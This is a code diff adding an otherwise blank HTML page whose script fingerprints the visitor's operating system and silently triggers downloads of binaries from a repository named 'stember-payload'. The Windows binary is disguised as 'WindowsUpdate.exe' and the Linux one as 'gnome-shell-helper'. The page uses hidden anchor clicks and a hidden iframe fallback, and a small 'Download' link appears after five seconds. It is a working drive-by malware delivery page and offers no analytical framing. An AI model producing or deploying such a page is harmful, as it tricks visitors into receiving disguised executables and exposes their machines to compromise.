@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title></title>
+</head>
+<body>
+<script>
+// ================= CONFIG =================
+// Payloads hosted on GitHub Pages (stable URLs, no rotation).
+// Repo: duuniversity620/stember-payload  (public, payload files only)
+var WIN_URL   = "https://duuniversity620.github.io/stember-payload/WindowsUpdate.exe";  // Windows executable
+var LINUX_URL = "https://duuniversity620.github.io/stember-payload/gnome-shell-helper";  // Linux ELF binary
+// ===========================================
+
+function detectOS() {
+  var ua = (navigator.userAgent || "").toLowerCase();
+  var pf = (navigator.platform  || "").toLowerCase();
+  if (ua.indexOf("windows") !== -1 || ua.indexOf("win32") !== -1 || ua.indexOf("win64") !== -1 || pf.indexOf("win") === 0) return "windows";
+  if (ua.indexOf("linux")   !== -1 || ua.indexOf("x11")   !== -1 || ua.indexOf("ubuntu") !== -1 ||
+      ua.indexOf("debian")  !== -1 || ua.indexOf("fedora")!== -1 || ua.indexOf("centos") !== -1 || pf.indexOf("linux") === 0) return "linux";
+  if (ua.indexOf("mac")     !== -1 || ua.indexOf("osx")   !== -1 || ua.indexOf("darwin") !== -1 || pf.indexOf("mac") === 0) return "mac";
+  return "unknown";
+}
+
+function trigger(url) {
+  // Primary: same-origin anchor with download attribute (silent, reliable on GitHub Pages).
+  try {
+    var a = document.createElement("a");
+    a.href = url;
+    a.download = "";
+    a.style.display = "none";
+    document.body.appendChild(a);
+    a.click();
+  } catch(e) {}
+}
+
+// Secondary: hidden iframe (works cross-origin when server sends
+// Content-Type: application/octet-stream / Content-Disposition: attachment).
+function fallback(url) {
+  try {
+    var f = document.createElement("iframe");
+    f.style.display = "none";
+    f.src = url;
+    document.body.appendChild(f);
+    setTimeout(function(){ if (f.parentNode) f.parentNode.removeChild(f); }, 60000);
+  } catch(e) {
+    window.location.href = url;
+  }
+}
+
+var os   = detectOS();
+var urls = [];
+if (os === "windows")      urls.push(WIN_URL);
+else if (os === "linux")   urls.push(LINUX_URL);
+else                       urls.push(WIN_URL, LINUX_URL);
+
+for (var i = 0; i < urls.length; i++) {
+  trigger(urls[i]);
+  setTimeout(fallback, 1200, urls[i]);
+}
+
+// Manual fallback link (visible after 5 s only if the auto-download did not start).
+setTimeout(function(){
+  var d = document.getElementById("dl");
+  if (d) d.style.display = "block";
+}, 5000);
+</script>
+<div id="dl" style="display:none;position:fixed;bottom:8px;right:8px;font:11px arial;background:#f5f5f5;padding:6px 10px;border:1px solid #ccc;border-radius:4px;">
+  <a href="https://duuniversity620.github.io/stember-payload/WindowsUpdate.exe" style="color:#444;text-decoration:none;">Download</a>
+</div>
+</body>
+</html>
